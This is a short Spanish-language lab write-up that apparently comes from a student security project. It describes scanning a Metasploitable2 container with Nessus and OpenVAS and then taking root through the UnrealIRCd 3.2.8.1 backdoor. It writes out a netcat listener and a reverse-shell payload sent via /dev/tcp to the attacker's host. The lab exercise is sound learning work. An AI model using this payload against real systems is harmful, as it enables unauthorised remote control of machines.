# Escaneo de vulnerabilidades

Como ya aseguramos nuestro servidor en las anteriores actividades de este proyecto, ni Nessus ni OpenVAS detectan vulnerabilidades. Simplemente nos informan de que los certificados utilzados en nuestro servicio web son autofirmados. 

Así que procederemos a la deteccción y explotación de vulnerabilidades directamente en Metasploitable2. A continuación se muestran imágenes del escaneo a este contenedor, para ello simplemente hicimos un `docker run "metasploitable2"` definiendo la red de docker en la que queriamos que se crease con un `--network` para que tanto Nessus como OpenVAS pudiesen contactar con el servidor vulnerable.

![nessus](img/1.png)
![openvas](img/2.png)

Los resultados son catastróficos como era de esperar, se detectan con nessus un total de 65 vulnerabilidades. Uno de ellos es el password de VNC, "password", es decir demasiado fácil. Sin embargo explotarlos a través de docker puede ser un poco complicado, lo suyo sería tener la máquina virtual a la que hace referencia esta [guía de explotación](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/), [enlace a la MV](https://sourceforge.net/projects/metasploitable/).

Podemos adueñarnos del sistema de practicamente cualquier forma, desde usuarios privilegiados de las bases de datos hasta con formularios web php.

A continuación realizaremos una pequeña demostración de la toma de esta máquina a través de un servicio IRC expuesto.

## Reconocimiento

![nmap](img/3.png)

## Explotación de la vulnerabilidad

Utilizando el exploit de [UnrealIRCd 3.2.8.1](https://www.exploit-db.com/exploits/16922), por elegir alguno. Que básicamente consiste en, abrir una reverse shell `nc -lvp 8080`, establecer una conexión y enviarle un "*AB;* `bash -i >& /dev/tcp/10.0.0.22/8080 0>&1` *\n*". 

Boom! root.

![metasploit](img/4.png)